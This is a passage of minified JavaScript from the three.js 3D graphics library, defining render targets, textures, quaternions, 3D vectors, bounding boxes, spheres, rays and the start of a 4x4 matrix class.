this.constructor().copy(this)}copy(e){this.width=e.width,this.height=e.height,this.depth=e.depth,this.scissor.copy(e.scissor),this.scissorTest=e.scissorTest,this.viewport.copy(e.viewport),this.texture=e.texture.clone(),this.texture.isRenderTargetTexture=!0;const t=Object.assign({},e.texture.image);return this.texture.source=new mo(t),this.depthBuffer=e.depthBuffer,this.stencilBuffer=e.stencilBuffer,e.depthTexture!==null&&(this.depthTexture=e.depthTexture.clone()),this.samples=e.samples,this}dispose(){this.dispatchEvent({type:"dispose"})}}class Tn extends ql{constructor(e=1,t=1,n={}){super(e,t,n),this.isWebGLRenderTarget=!0}}class _o extends Tt{constructor(e=null,t=1,n=1,r=1){super(null),this.isDataArrayTexture=!0,this.image={data:e,width:t,height:n,depth:r},this.magFilter=gt,this.minFilter=gt,this.wrapR=Ft,this.generateMipmaps=!1,this.flipY=!1,this.unpackAlignment=1}}class Yl extends Tt{constructor(e=null,t=1,n=1,r=1){super(null),this.isData3DTexture=!0,this.image={data:e,width:t,height:n,depth:r},this.magFilter=gt,this.minFilter=gt,this.wrapR=Ft,this.generateMipmaps=!1,this.flipY=!1,this.unpackAlignment=1}}class _i{constructor(e=0,t=0,n=0,r=1){this.isQuaternion=!0,this._x=e,this._y=t,this._z=n,this._w=r}static slerpFlat(e,t,n,r,s,o,a){let l=n[r+0],d=n[r+1],u=n[r+2],h=n[r+3];const p=s[o+0],m=s[o+1],E=s[o+2],x=s[o+3];if(a===0){e[t+0]=l,e[t+1]=d,e[t+2]=u,e[t+3]=h;return}if(a===1){e[t+0]=p,e[t+1]=m,e[t+2]=E,e[t+3]=x;return}if(h!==x||l!==p||d!==m||u!==E){let f=1-a;const c=l*p+d*m+u*E+h*x,g=c>=0?1:-1,_=1-c*c;if(_>Number.EPSILON){const w=Math.sqrt(_),M=Math.atan2(w,c*g);f=Math.sin(f*M)/w,a=Math.sin(a*M)/w}const v=a*g;if(l=l*f+p*v,d=d*f+m*v,u=u*f+E*v,h=h*f+x*v,f===1-a){const w=1/Math.sqrt(l*l+d*d+u*u+h*h);l*=w,d*=w,u*=w,h*=w}}e[t]=l,e[t+1]=d,e[t+2]=u,e[t+3]=h}static multiplyQuaternionsFlat(e,t,n,r,s,o){const a=n[r],l=n[r+1],d=n[r+2],u=n[r+3],h=s[o],p=s[o+1],m=s[o+2],E=s[o+3];return e[t]=a*E+u*h+l*m-d*p,e[t+1]=l*E+u*p+d*h-a*m,e[t+2]=d*E+u*m+a*p-l*h,e[t+3]=u*E-a*h-l*p-d*m,e}get x(){return this._x}set x(e){this._x=e,this._onChangeCallback()}get y(){return this._y}set y(e){this._y=e,this._onChangeCallback()}get z(){return this._z}set z(e){this._z=e,this._onChangeCallback()}get w(){return this._w}set w(e){this._w=e,this._onChangeCallback()}set(e,t,n,r){return this._x=e,this._y=t,this._z=n,this._w=r,this._onChangeCallback(),this}clone(){return new this.constructor(this._x,this._y,this._z,this._w)}copy(e){return this._x=e.x,this._y=e.y,this._z=e.z,this._w=e.w,this._onChangeCallback(),this}setFromEuler(e,t=!0){const n=e._x,r=e._y,s=e._z,o=e._order,a=Math.cos,l=Math.sin,d=a(n/2),u=a(r/2),h=a(s/2),p=l(n/2),m=l(r/2),E=l(s/2);switch(o){case"XYZ":this._x=p*u*h+d*m*E,this._y=d*m*h-p*u*E,this._z=d*u*E+p*m*h,this._w=d*u*h-p*m*E;break;case"YXZ":this._x=p*u*h+d*m*E,this._y=d*m*h-p*u*E,this._z=d*u*E-p*m*h,this._w=d*u*h+p*m*E;break;case"ZXY":this._x=p*u*h-d*m*E,this._y=d*m*h+p*u*E,this._z=d*u*E+p*m*h,this._w=d*u*h-p*m*E;break;case"ZYX":this._x=p*u*h-d*m*E,this._y=d*m*h+p*u*E,this._z=d*u*E-p*m*h,this._w=d*u*h+p*m*E;break;case"YZX":this._x=p*u*h+d*m*E,this._y=d*m*h+p*u*E,this._z=d*u*E-p*m*h,this._w=d*u*h-p*m*E;break;case"XZY":this._x=p*u*h-d*m*E,this._y=d*m*h-p*u*E,this._z=d*u*E+p*m*h,this._w=d*u*h+p*m*E;break;default:console.warn("THREE.Quaternion: .setFromEuler() encountered an unknown order: "+o)}return t===!0&&this._onChangeCallback(),this}setFromAxisAngle(e,t){const n=t/2,r=Math.sin(n);return this._x=e.x*r,this._y=e.y*r,this._z=e.z*r,this._w=Math.cos(n),this._onChangeCallback(),this}setFromRotationMatrix(e){const t=e.elements,n=t[0],r=t[4],s=t[8],o=t[1],a=t[5],l=t[9],d=t[2],u=t[6],h=t[10],p=n+a+h;if(p>0){const m=.5/Math.sqrt(p+1);this._w=.25/m,this._x=(u-l)*m,this._y=(s-d)*m,this._z=(o-r)*m}else if(n>a&&n>h){const m=2*Math.sqrt(1+n-a-h);this._w=(u-l)/m,this._x=.25*m,this._y=(r+o)/m,this._z=(s+d)/m}else if(a>h){const m=2*Math.sqrt(1+a-n-h);this._w=(s-d)/m,this._x=(r+o)/m,this._y=.25*m,this._z=(l+u)/m}else{const m=2*Math.sqrt(1+h-n-a);this._w=(o-r)/m,this._x=(s+d)/m,this._y=(l+u)/m,this._z=.25*m}return this._onChangeCallback(),this}setFromUnitVectors(e,t){let n=e.dot(t)+1;return n<Number.EPSILON?(n=0,Math.abs(e.x)>Math.abs(e.z)?(this._x=-e.y,this._y=e.x,this._z=0,this._w=n):(this._x=0,this._y=-e.z,this._z=e.y,this._w=n)):(this._x=e.y*t.z-e.z*t.y,this._y=e.z*t.x-e.x*t.z,this._z=e.x*t.y-e.y*t.x,this._w=n),this.normalize()}angleTo(e){return 2*Math.acos(Math.abs(xt(this.dot(e),-1,1)))}rotateTowards(e,t){const n=this.angleTo(e);if(n===0)return this;const r=Math.min(1,t/n);return this.slerp(e,r),this}identity(){return this.set(0,0,0,1)}invert(){return this.conjugate()}conjugate(){return this._x*=-1,this._y*=-1,this._z*=-1,this._onChangeCallback(),this}dot(e){return this._x*e._x+this._y*e._y+this._z*e._z+this._w*e._w}lengthSq(){return this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w}length(){return Math.sqrt(this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w)}normalize(){let e=this.length();return e===0?(this._x=0,this._y=0,this._z=0,this._w=1):(e=1/e,this._x=this._x*e,this._y=this._y*e,this._z=this._z*e,this._w=this._w*e),this._onChangeCallback(),this}multiply(e){return this.multiplyQuaternions(this,e)}premultiply(e){return this.multiplyQuaternions(e,this)}multiplyQuaternions(e,t){const n=e._x,r=e._y,s=e._z,o=e._w,a=t._x,l=t._y,d=t._z,u=t._w;return this._x=n*u+o*a+r*d-s*l,this._y=r*u+o*l+s*a-n*d,this._z=s*u+o*d+n*l-r*a,this._w=o*u-n*a-r*l-s*d,this._onChangeCallback(),this}slerp(e,t){if(t===0)return this;if(t===1)return this.copy(e);const n=this._x,r=this._y,s=this._z,o=this._w;let a=o*e._w+n*e._x+r*e._y+s*e._z;if(a<0?(this._w=-e._w,this._x=-e._x,this._y=-e._y,this._z=-e._z,a=-a):this.copy(e),a>=1)return this._w=o,this._x=n,this._y=r,this._z=s,this;const l=1-a*a;if(l<=Number.EPSILON){const m=1-t;return this._w=m*o+t*this._w,this._x=m*n+t*this._x,this._y=m*r+t*this._y,this._z=m*s+t*this._z,this.normalize(),this}const d=Math.sqrt(l),u=Math.atan2(d,a),h=Math.sin((1-t)*u)/d,p=Math.sin(t*u)/d;return this._w=o*h+this._w*p,this._x=n*h+this._x*p,this._y=r*h+this._y*p,this._z=s*h+this._z*p,this._onChangeCallback(),this}slerpQuaternions(e,t,n){return this.copy(e).slerp(t,n)}random(){const e=Math.random(),t=Math.sqrt(1-e),n=Math.sqrt(e),r=2*Math.PI*Math.random(),s=2*Math.PI*Math.random();return this.set(t*Math.cos(r),n*Math.sin(s),n*Math.cos(s),t*Math.sin(r))}equals(e){return e._x===this._x&&e._y===this._y&&e._z===this._z&&e._w===this._w}fromArray(e,t=0){return this._x=e[t],this._y=e[t+1],this._z=e[t+2],this._w=e[t+3],this._onChangeCallback(),this}toArray(e=[],t=0){return e[t]=this._x,e[t+1]=this._y,e[t+2]=this._z,e[t+3]=this._w,e}fromBufferAttribute(e,t){return this._x=e.getX(t),this._y=e.getY(t),this._z=e.getZ(t),this._w=e.getW(t),this._onChangeCallback(),this}toJSON(){return this.toArray()}_onChange(e){return this._onChangeCallback=e,this}_onChangeCallback(){}*[Symbol.iterator](){yield this._x,yield this._y,yield this._z,yield this._w}}class L{constructor(e=0,t=0,n=0){L.prototype.isVector3=!0,this.x=e,this.y=t,this.z=n}set(e,t,n){return n===void 0&&(n=this.z),this.x=e,this.y=t,this.z=n,this}setScalar(e){return this.x=e,this.y=e,this.z=e,this}setX(e){return this.x=e,this}setY(e){return this.y=e,this}setZ(e){return this.z=e,this}setComponent(e,t){switch(e){case 0:this.x=t;break;case 1:this.y=t;break;case 2:this.z=t;break;default:throw new Error("index is out of range: "+e)}return this}getComponent(e){switch(e){case 0:return this.x;case 1:return this.y;case 2:return this.z;default:throw new Error("index is out of range: "+e)}}clone(){return new this.constructor(this.x,this.y,this.z)}copy(e){return this.x=e.x,this.y=e.y,this.z=e.z,this}add(e){return this.x+=e.x,this.y+=e.y,this.z+=e.z,this}addScalar(e){return this.x+=e,this.y+=e,this.z+=e,this}addVectors(e,t){return this.x=e.x+t.x,this.y=e.y+t.y,this.z=e.z+t.z,this}addScaledVector(e,t){return this.x+=e.x*t,this.y+=e.y*t,this.z+=e.z*t,this}sub(e){return this.x-=e.x,this.y-=e.y,this.z-=e.z,this}subScalar(e){return this.x-=e,this.y-=e,this.z-=e,this}subVectors(e,t){return this.x=e.x-t.x,this.y=e.y-t.y,this.z=e.z-t.z,this}multiply(e){return this.x*=e.x,this.y*=e.y,this.z*=e.z,this}multiplyScalar(e){return this.x*=e,this.y*=e,this.z*=e,this}multiplyVectors(e,t){return this.x=e.x*t.x,this.y=e.y*t.y,this.z=e.z*t.z,this}applyEuler(e){return this.applyQuaternion(sa.setFromEuler(e))}applyAxisAngle(e,t){return this.applyQuaternion(sa.setFromAxisAngle(e,t))}applyMatrix3(e){const t=this.x,n=this.y,r=this.z,s=e.elements;return this.x=s[0]*t+s[3]*n+s[6]*r,this.y=s[1]*t+s[4]*n+s[7]*r,this.z=s[2]*t+s[5]*n+s[8]*r,this}applyNormalMatrix(e){return this.applyMatrix3(e).normalize()}applyMatrix4(e){const t=this.x,n=this.y,r=this.z,s=e.elements,o=1/(s[3]*t+s[7]*n+s[11]*r+s[15]);return this.x=(s[0]*t+s[4]*n+s[8]*r+s[12])*o,this.y=(s[1]*t+s[5]*n+s[9]*r+s[13])*o,this.z=(s[2]*t+s[6]*n+s[10]*r+s[14])*o,this}applyQuaternion(e){const t=this.x,n=this.y,r=this.z,s=e.x,o=e.y,a=e.z,l=e.w,d=2*(o*r-a*n),u=2*(a*t-s*r),h=2*(s*n-o*t);return this.x=t+l*d+o*h-a*u,this.y=n+l*u+a*d-s*h,this.z=r+l*h+s*u-o*d,this}project(e){return this.applyMatrix4(e.matrixWorldInverse).applyMatrix4(e.projectionMatrix)}unproject(e){return this.applyMatrix4(e.projectionMatrixInverse).applyMatrix4(e.matrixWorld)}transformDirection(e){const t=this.x,n=this.y,r=this.z,s=e.elements;return this.x=s[0]*t+s[4]*n+s[8]*r,this.y=s[1]*t+s[5]*n+s[9]*r,this.z=s[2]*t+s[6]*n+s[10]*r,this.normalize()}divide(e){return this.x/=e.x,this.y/=e.y,this.z/=e.z,this}divideScalar(e){return this.multiplyScalar(1/e)}min(e){return this.x=Math.min(this.x,e.x),this.y=Math.min(this.y,e.y),this.z=Math.min(this.z,e.z),this}max(e){return this.x=Math.max(this.x,e.x),this.y=Math.max(this.y,e.y),this.z=Math.max(this.z,e.z),this}clamp(e,t){return this.x=Math.max(e.x,Math.min(t.x,this.x)),this.y=Math.max(e.y,Math.min(t.y,this.y)),this.z=Math.max(e.z,Math.min(t.z,this.z)),this}clampScalar(e,t){return this.x=Math.max(e,Math.min(t,this.x)),this.y=Math.max(e,Math.min(t,this.y)),this.z=Math.max(e,Math.min(t,this.z)),this}clampLength(e,t){const n=this.length();return this.divideScalar(n||1).multiplyScalar(Math.max(e,Math.min(t,n)))}floor(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this.z=Math.floor(this.z),this}ceil(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this.z=Math.ceil(this.z),this}round(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this.z=Math.round(this.z),this}roundToZero(){return this.x=Math.trunc(this.x),this.y=Math.trunc(this.y),this.z=Math.trunc(this.z),this}negate(){return this.x=-this.x,this.y=-this.y,this.z=-this.z,this}dot(e){return this.x*e.x+this.y*e.y+this.z*e.z}lengthSq(){return this.x*this.x+this.y*this.y+this.z*this.z}length(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z)}manhattanLength(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)}normalize(){return this.divideScalar(this.length()||1)}setLength(e){return this.normalize().multiplyScalar(e)}lerp(e,t){return this.x+=(e.x-this.x)*t,this.y+=(e.y-this.y)*t,this.z+=(e.z-this.z)*t,this}lerpVectors(e,t,n){return this.x=e.x+(t.x-e.x)*n,this.y=e.y+(t.y-e.y)*n,this.z=e.z+(t.z-e.z)*n,this}cross(e){return this.crossVectors(this,e)}crossVectors(e,t){const n=e.x,r=e.y,s=e.z,o=t.x,a=t.y,l=t.z;return this.x=r*l-s*a,this.y=s*o-n*l,this.z=n*a-r*o,this}projectOnVector(e){const t=e.lengthSq();if(t===0)return this.set(0,0,0);const n=e.dot(this)/t;return this.copy(e).multiplyScalar(n)}projectOnPlane(e){return yr.copy(this).projectOnVector(e),this.sub(yr)}reflect(e){return this.sub(yr.copy(e).multiplyScalar(2*this.dot(e)))}angleTo(e){const t=Math.sqrt(this.lengthSq()*e.lengthSq());if(t===0)return Math.PI/2;const n=this.dot(e)/t;return Math.acos(xt(n,-1,1))}distanceTo(e){return Math.sqrt(this.distanceToSquared(e))}distanceToSquared(e){const t=this.x-e.x,n=this.y-e.y,r=this.z-e.z;return t*t+n*n+r*r}manhattanDistanceTo(e){return Math.abs(this.x-e.x)+Math.abs(this.y-e.y)+Math.abs(this.z-e.z)}setFromSpherical(e){return this.setFromSphericalCoords(e.radius,e.phi,e.theta)}setFromSphericalCoords(e,t,n){const r=Math.sin(t)*e;return this.x=r*Math.sin(n),this.y=Math.cos(t)*e,this.z=r*Math.cos(n),this}setFromCylindrical(e){return this.setFromCylindricalCoords(e.radius,e.theta,e.y)}setFromCylindricalCoords(e,t,n){return this.x=e*Math.sin(t),this.y=n,this.z=e*Math.cos(t),this}setFromMatrixPosition(e){const t=e.elements;return this.x=t[12],this.y=t[13],this.z=t[14],this}setFromMatrixScale(e){const t=this.setFromMatrixColumn(e,0).length(),n=this.setFromMatrixColumn(e,1).length(),r=this.setFromMatrixColumn(e,2).length();return this.x=t,this.y=n,this.z=r,this}setFromMatrixColumn(e,t){return this.fromArray(e.elements,t*4)}setFromMatrix3Column(e,t){return this.fromArray(e.elements,t*3)}setFromEuler(e){return this.x=e._x,this.y=e._y,this.z=e._z,this}setFromColor(e){return this.x=e.r,this.y=e.g,this.z=e.b,this}equals(e){return e.x===this.x&&e.y===this.y&&e.z===this.z}fromArray(e,t=0){return this.x=e[t],this.y=e[t+1],this.z=e[t+2],this}toArray(e=[],t=0){return e[t]=this.x,e[t+1]=this.y,e[t+2]=this.z,e}fromBufferAttribute(e,t){return this.x=e.getX(t),this.y=e.getY(t),this.z=e.getZ(t),this}random(){return this.x=Math.random(),this.y=Math.random(),this.z=Math.random(),this}randomDirection(){const e=(Math.random()-.5)*2,t=Math.random()*Math.PI*2,n=Math.sqrt(1-e**2);return this.x=n*Math.cos(t),this.y=n*Math.sin(t),this.z=e,this}*[Symbol.iterator](){yield this.x,yield this.y,yield this.z}}const yr=new L,sa=new _i;class Rn{constructor(e=new L(1/0,1/0,1/0),t=new L(-1/0,-1/0,-1/0)){this.isBox3=!0,this.min=e,this.max=t}set(e,t){return this.min.copy(e),this.max.copy(t),this}setFromArray(e){this.makeEmpty();for(let t=0,n=e.length;t<n;t+=3)this.expandByPoint(Lt.fromArray(e,t));return this}setFromBufferAttribute(e){this.makeEmpty();for(let t=0,n=e.count;t<n;t++)this.expandByPoint(Lt.fromBufferAttribute(e,t));return this}setFromPoints(e){this.makeEmpty();for(let t=0,n=e.length;t<n;t++)this.expandByPoint(e[t]);return this}setFromCenterAndSize(e,t){const n=Lt.copy(t).multiplyScalar(.5);return this.min.copy(e).sub(n),this.max.copy(e).add(n),this}setFromObject(e,t=!1){return this.makeEmpty(),this.expandByObject(e,t)}clone(){return new this.constructor().copy(this)}copy(e){return this.min.copy(e.min),this.max.copy(e.max),this}makeEmpty(){return this.min.x=this.min.y=this.min.z=1/0,this.max.x=this.max.y=this.max.z=-1/0,this}isEmpty(){return this.max.x<this.min.x||this.max.y<this.min.y||this.max.z<this.min.z}getCenter(e){return this.isEmpty()?e.set(0,0,0):e.addVectors(this.min,this.max).multiplyScalar(.5)}getSize(e){return this.isEmpty()?e.set(0,0,0):e.subVectors(this.max,this.min)}expandByPoint(e){return this.min.min(e),this.max.max(e),this}expandByVector(e){return this.min.sub(e),this.max.add(e),this}expandByScalar(e){return this.min.addScalar(-e),this.max.addScalar(e),this}expandByObject(e,t=!1){e.updateWorldMatrix(!1,!1);const n=e.geometry;if(n!==void 0){const s=n.getAttribute("position");if(t===!0&&s!==void 0&&e.isInstancedMesh!==!0)for(let o=0,a=s.count;o<a;o++)e.isMesh===!0?e.getVertexPosition(o,Lt):Lt.fromBufferAttribute(s,o),Lt.applyMatrix4(e.matrixWorld),this.expandByPoint(Lt);else e.boundingBox!==void 0?(e.boundingBox===null&&e.computeBoundingBox(),Si.copy(e.boundingBox)):(n.boundingBox===null&&n.computeBoundingBox(),Si.copy(n.boundingBox)),Si.applyMatrix4(e.matrixWorld),this.union(Si)}const r=e.children;for(let s=0,o=r.length;s<o;s++)this.expandByObject(r[s],t);return this}containsPoint(e){return!(e.x<this.min.x||e.x>this.max.x||e.y<this.min.y||e.y>this.max.y||e.z<this.min.z||e.z>this.max.z)}containsBox(e){return this.min.x<=e.min.x&&e.max.x<=this.max.x&&this.min.y<=e.min.y&&e.max.y<=this.max.y&&this.min.z<=e.min.z&&e.max.z<=this.max.z}getParameter(e,t){return t.set((e.x-this.min.x)/(this.max.x-this.min.x),(e.y-this.min.y)/(this.max.y-this.min.y),(e.z-this.min.z)/(this.max.z-this.min.z))}intersectsBox(e){return!(e.max.x<this.min.x||e.min.x>this.max.x||e.max.y<this.min.y||e.min.y>this.max.y||e.max.z<this.min.z||e.min.z>this.max.z)}intersectsSphere(e){return this.clampPoint(e.center,Lt),Lt.distanceToSquared(e.center)<=e.radius*e.radius}intersectsPlane(e){let t,n;return e.normal.x>0?(t=e.normal.x*this.min.x,n=e.normal.x*this.max.x):(t=e.normal.x*this.max.x,n=e.normal.x*this.min.x),e.normal.y>0?(t+=e.normal.y*this.min.y,n+=e.normal.y*this.max.y):(t+=e.normal.y*this.max.y,n+=e.normal.y*this.min.y),e.normal.z>0?(t+=e.normal.z*this.min.z,n+=e.normal.z*this.max.z):(t+=e.normal.z*this.max.z,n+=e.normal.z*this.min.z),t<=-e.constant&&n>=-e.constant}intersectsTriangle(e){if(this.isEmpty())return!1;this.getCenter(ri),Mi.subVectors(this.max,ri),Pn.subVectors(e.a,ri),In.subVectors(e.b,ri),Ln.subVectors(e.c,ri),Qt.subVectors(In,Pn),Jt.subVectors(Ln,In),pn.subVectors(Pn,Ln);let t=[0,-Qt.z,Qt.y,0,-Jt.z,Jt.y,0,-pn.z,pn.y,Qt.z,0,-Qt.x,Jt.z,0,-Jt.x,pn.z,0,-pn.x,-Qt.y,Qt.x,0,-Jt.y,Jt.x,0,-pn.y,pn.x,0];return!Sr(t,Pn,In,Ln,Mi)||(t=[1,0,0,0,1,0,0,0,1],!Sr(t,Pn,In,Ln,Mi))?!1:(bi.crossVectors(Qt,Jt),t=[bi.x,bi.y,bi.z],Sr(t,Pn,In,Ln,Mi))}clampPoint(e,t){return t.copy(e).clamp(this.min,this.max)}distanceToPoint(e){return this.clampPoint(e,Lt).distanceTo(e)}getBoundingSphere(e){return this.isEmpty()?e.makeEmpty():(this.getCenter(e.center),e.radius=this.getSize(Lt).length()*.5),e}intersect(e){return this.min.max(e.min),this.max.min(e.max),this.isEmpty()&&this.makeEmpty(),this}union(e){return this.min.min(e.min),this.max.max(e.max),this}applyMatrix4(e){return this.isEmpty()?this:(Wt[0].set(this.min.x,this.min.y,this.min.z).applyMatrix4(e),Wt[1].set(this.min.x,this.min.y,this.max.z).applyMatrix4(e),Wt[2].set(this.min.x,this.max.y,this.min.z).applyMatrix4(e),Wt[3].set(this.min.x,this.max.y,this.max.z).applyMatrix4(e),Wt[4].set(this.max.x,this.min.y,this.min.z).applyMatrix4(e),Wt[5].set(this.max.x,this.min.y,this.max.z).applyMatrix4(e),Wt[6].set(this.max.x,this.max.y,this.min.z).applyMatrix4(e),Wt[7].set(this.max.x,this.max.y,this.max.z).applyMatrix4(e),this.setFromPoints(Wt),this)}translate(e){return this.min.add(e),this.max.add(e),this}equals(e){return e.min.equals(this.min)&&e.max.equals(this.max)}}const Wt=[new L,new L,new L,new L,new L,new L,new L,new L],Lt=new L,Si=new Rn,Pn=new L,In=new L,Ln=new L,Qt=new L,Jt=new L,pn=new L,ri=new L,Mi=new L,bi=new L,fn=new L;function Sr(i,e,t,n,r){for(let s=0,o=i.length-3;s<=o;s+=3){fn.fromArray(i,s);const a=r.x*Math.abs(fn.x)+r.y*Math.abs(fn.y)+r.z*Math.abs(fn.z),l=e.dot(fn),d=t.dot(fn),u=n.dot(fn);if(Math.max(-Math.max(l,d,u),Math.min(l,d,u))>a)return!1}return!0}const jl=new Rn,si=new L,Mr=new L;class ei{constructor(e=new L,t=-1){this.isSphere=!0,this.center=e,this.radius=t}set(e,t){return this.center.copy(e),this.radius=t,this}setFromPoints(e,t){const n=this.center;t!==void 0?n.copy(t):jl.setFromPoints(e).getCenter(n);let r=0;for(let s=0,o=e.length;s<o;s++)r=Math.max(r,n.distanceToSquared(e[s]));return this.radius=Math.sqrt(r),this}copy(e){return this.center.copy(e.center),this.radius=e.radius,this}isEmpty(){return this.radius<0}makeEmpty(){return this.center.set(0,0,0),this.radius=-1,this}containsPoint(e){return e.distanceToSquared(this.center)<=this.radius*this.radius}distanceToPoint(e){return e.distanceTo(this.center)-this.radius}intersectsSphere(e){const t=this.radius+e.radius;return e.center.distanceToSquared(this.center)<=t*t}intersectsBox(e){return e.intersectsSphere(this)}intersectsPlane(e){return Math.abs(e.distanceToPoint(this.center))<=this.radius}clampPoint(e,t){const n=this.center.distanceToSquared(e);return t.copy(e),n>this.radius*this.radius&&(t.sub(this.center).normalize(),t.multiplyScalar(this.radius).add(this.center)),t}getBoundingBox(e){return this.isEmpty()?(e.makeEmpty(),e):(e.set(this.center,this.center),e.expandByScalar(this.radius),e)}applyMatrix4(e){return this.center.applyMatrix4(e),this.radius=this.radius*e.getMaxScaleOnAxis(),this}translate(e){return this.center.add(e),this}expandByPoint(e){if(this.isEmpty())return this.center.copy(e),this.radius=0,this;si.subVectors(e,this.center);const t=si.lengthSq();if(t>this.radius*this.radius){const n=Math.sqrt(t),r=(n-this.radius)*.5;this.center.addScaledVector(si,r/n),this.radius+=r}return this}union(e){return e.isEmpty()?this:this.isEmpty()?(this.copy(e),this):(this.center.equals(e.center)===!0?this.radius=Math.max(this.radius,e.radius):(Mr.subVectors(e.center,this.center).setLength(e.radius),this.expandByPoint(si.copy(e.center).add(Mr)),this.expandByPoint(si.copy(e.center).sub(Mr))),this)}equals(e){return e.center.equals(this.center)&&e.radius===this.radius}clone(){return new this.constructor().copy(this)}}const Xt=new L,br=new L,Ti=new L,en=new L,Tr=new L,Ai=new L,Ar=new L;class ls{constructor(e=new L,t=new L(0,0,-1)){this.origin=e,this.direction=t}set(e,t){return this.origin.copy(e),this.direction.copy(t),this}copy(e){return this.origin.copy(e.origin),this.direction.copy(e.direction),this}at(e,t){return t.copy(this.origin).addScaledVector(this.direction,e)}lookAt(e){return this.direction.copy(e).sub(this.origin).normalize(),this}recast(e){return this.origin.copy(this.at(e,Xt)),this}closestPointToPoint(e,t){t.subVectors(e,this.origin);const n=t.dot(this.direction);return n<0?t.copy(this.origin):t.copy(this.origin).addScaledVector(this.direction,n)}distanceToPoint(e){return Math.sqrt(this.distanceSqToPoint(e))}distanceSqToPoint(e){const t=Xt.subVectors(e,this.origin).dot(this.direction);return t<0?this.origin.distanceToSquared(e):(Xt.copy(this.origin).addScaledVector(this.direction,t),Xt.distanceToSquared(e))}distanceSqToSegment(e,t,n,r){br.copy(e).add(t).multiplyScalar(.5),Ti.copy(t).sub(e).normalize(),en.copy(this.origin).sub(br);const s=e.distanceTo(t)*.5,o=-this.direction.dot(Ti),a=en.dot(this.direction),l=-en.dot(Ti),d=en.lengthSq(),u=Math.abs(1-o*o);let h,p,m,E;if(u>0)if(h=o*l-a,p=o*a-l,E=s*u,h>=0)if(p>=-E)if(p<=E){const x=1/u;h*=x,p*=x,m=h*(h+o*p+2*a)+p*(o*h+p+2*l)+d}else p=s,h=Math.max(0,-(o*p+a)),m=-h*h+p*(p+2*l)+d;else p=-s,h=Math.max(0,-(o*p+a)),m=-h*h+p*(p+2*l)+d;else p<=-E?(h=Math.max(0,-(-o*s+a)),p=h>0?-s:Math.min(Math.max(-s,-l),s),m=-h*h+p*(p+2*l)+d):p<=E?(h=0,p=Math.min(Math.max(-s,-l),s),m=p*(p+2*l)+d):(h=Math.max(0,-(o*s+a)),p=h>0?s:Math.min(Math.max(-s,-l),s),m=-h*h+p*(p+2*l)+d);else p=o>0?-s:s,h=Math.max(0,-(o*p+a)),m=-h*h+p*(p+2*l)+d;return n&&n.copy(this.origin).addScaledVector(this.direction,h),r&&r.copy(br).addScaledVector(Ti,p),m}intersectSphere(e,t){Xt.subVectors(e.center,this.origin);const n=Xt.dot(this.direction),r=Xt.dot(Xt)-n*n,s=e.radius*e.radius;if(r>s)return null;const o=Math.sqrt(s-r),a=n-o,l=n+o;return l<0?null:a<0?this.at(l,t):this.at(a,t)}intersectsSphere(e){return this.distanceSqToPoint(e.center)<=e.radius*e.radius}distanceToPlane(e){const t=e.normal.dot(this.direction);if(t===0)return e.distanceToPoint(this.origin)===0?0:null;const n=-(this.origin.dot(e.normal)+e.constant)/t;return n>=0?n:null}intersectPlane(e,t){const n=this.distanceToPlane(e);return n===null?null:this.at(n,t)}intersectsPlane(e){const t=e.distanceToPoint(this.origin);return t===0||e.normal.dot(this.direction)*t<0}intersectBox(e,t){let n,r,s,o,a,l;const d=1/this.direction.x,u=1/this.direction.y,h=1/this.direction.z,p=this.origin;return d>=0?(n=(e.min.x-p.x)*d,r=(e.max.x-p.x)*d):(n=(e.max.x-p.x)*d,r=(e.min.x-p.x)*d),u>=0?(s=(e.min.y-p.y)*u,o=(e.max.y-p.y)*u):(s=(e.max.y-p.y)*u,o=(e.min.y-p.y)*u),n>o||s>r||((s>n||isNaN(n))&&(n=s),(o<r||isNaN(r))&&(r=o),h>=0?(a=(e.min.z-p.z)*h,l=(e.max.z-p.z)*h):(a=(e.max.z-p.z)*h,l=(e.min.z-p.z)*h),n>l||a>r)||((a>n||n!==n)&&(n=a),(l<r||r!==r)&&(r=l),r<0)?null:this.at(n>=0?n:r,t)}intersectsBox(e){return this.intersectBox(e,Xt)!==null}intersectTriangle(e,t,n,r,s){Tr.subVectors(t,e),Ai.subVectors(n,e),Ar.crossVectors(Tr,Ai);let o=this.direction.dot(Ar),a;if(o>0){if(r)return null;a=1}else if(o<0)a=-1,o=-o;else return null;en.subVectors(this.origin,e);const l=a*this.direction.dot(Ai.crossVectors(en,Ai));if(l<0)return null;const d=a*this.direction.dot(Tr.cross(en));if(d<0||l+d>o)return null;const u=-a*en.dot(Ar);return u<0?null:this.at(u/o,s)}applyMatrix4(e){return this.origin.applyMatrix4(e),this.direction.transformDirection(e),this}equals(e){return e.origin.equals(this.origin)&&e.direction.equals(this.direction)}clone(){return new this.constructor().copy(this)}}class Ze{constructor(e,t,n,r,s,o,a,l,d,u,h,p,m,E,x,f){Ze.prototype.isMatrix4=!0,this.elements=[1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1],e!==void 0&&this.set(e,t,n,r,s,o,a,l,d,u,h,p,m,E,x,f)}set(e,t,n,r,s,o,a,l,d,u,h,p,m,E,x,f){const c=this.elements;return c[0]=e,c[4]=t,c[8]=n,c[12]=r,c[1]=s,c[5]=o,c[9]=a,c[13]=l,c[2]=d,c[6]=u,c[10]=h,c[14]=p,c[3]=m,c[7]=E,c[11]=x,c[15]=f,this}identity(){return this.set(1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1),this}clone(){return new Ze().fromArray(this.elements)}copy(e){const t=this.elements,n=e.elements;return t[0]=n[0],t[1]=n[1],t[2]=n[2],t[3]=n[3],t[4]=n[4],t[5]=n[5],t[6]=n[6],t[7]=n[7],t[8]=n[8],t[9]=n[9],t[10]=n[10],t[11]=n[11],t[12]=n[12],t[13]=n[13],t[14]=n[14],t[15]=n[15],this}copyPosition(e){const t=this.elements,n=e.elements;return t[12]=n[12],t[13]=n[13],t[14]=n[14],this}setFromMatrix3(e){const t=e.elements;return this.set(t[0],t[3],t[6],0,t[1],t[4],t[7],0,t[2],t[5],t[8],0,0,0,0,1),this}extractBasis(e,t,n){return e.setFromMatrixColumn(this,0),t.setFromMatrixColumn(this,1),n.setFromMatrixColumn(this,2),this}makeBasis(e,t,n){return 